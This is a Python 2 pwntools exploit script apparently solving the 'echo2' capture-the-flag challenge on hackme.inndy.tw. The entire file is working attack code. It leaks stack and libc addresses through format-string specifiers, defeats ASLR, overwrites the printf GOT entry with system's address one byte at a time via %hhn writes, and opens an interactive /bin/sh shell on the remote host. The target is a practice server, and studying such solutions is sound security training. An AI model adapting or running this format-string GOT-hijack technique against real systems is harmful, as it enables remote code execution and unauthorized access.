#!/usr/bin/env python2
from pwn import *
import pwnlib.elf
import pwnlib.shellcraft
import time

# init
e = ELF('/tmp/echo2')
lib = ELF('/tmp/libc-2.23.so.x86_64')
#c = process('/tmp/echo2', env={'LD_PRELOAD': '/tmp/libc-2.23.so.x86_64'})
c = remote('hackme.inndy.tw', 7712)

context.os='linux'
context.arch='amd64'

# get ASLR offset
# lib lib lib buffer
c.sendline("%lx %lx %lx %lx")
result = c.recvline().split()
stack_offset = int(result[3], 16) # to get address find got table
libc_offset = int(result[0], 16) - 0x3c3963 # to get system function address

# get text
format_string_start = 5
c.sendline("%{}$lx".format(36 + format_string_start))
result = c.recvline()
text_offset = int(result, 16) - 0xa03

# get printf got
printf_got = text_offset + e.got['printf']
print(hex(printf_got))

# put address to printf got
buffer_data_offset = 13
printf_stack_address = stack_offset + 8 * buffer_data_offset
ans = "AAAAAAAA" * (buffer_data_offset + 6) + p64(printf_got + 3) + '\n'
ans += "AAAAAAAA" * (buffer_data_offset + 4) + p64(printf_got + 2) + '\n'
ans += "AAAAAAAA" * (buffer_data_offset + 2) + p64(printf_got + 1) + '\n'
ans += "AAAAAAAA" * buffer_data_offset + p64(printf_got)
c.sendline(ans)

# get system got
system_got = libc_offset + lib.symbols['system']
print(hex(system_got))

# gothijack
little_byte = printf_got & 0xff
payload = ''
char_count = 0
def write_byte(byte, arg):
    global char_count
    byte = (byte - char_count) % 256
    char_count = (char_count + byte) % 256
    return '%{}c%{}$hhn'.format(byte, arg)

for i in range(4):
    # set byte
    payload += write_byte((system_got & (0xff << (i * 8))) >> (i * 8), format_string_start + buffer_data_offset + i * 2 + 1)

c.sendline(payload + "\n/bin/sh")

c.interactive()
c.close()
